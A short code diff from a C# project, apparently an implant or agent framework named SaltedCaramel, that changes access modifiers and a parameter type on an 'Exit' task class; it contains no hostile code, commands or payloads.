@@ -2,9 +2,9 @@
 
 namespace SaltedCaramel.Tasks
 {
-    internal class Exit
+    class Exit
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(SCTaskObject task, SCImplant implant)
         {
             try
             {
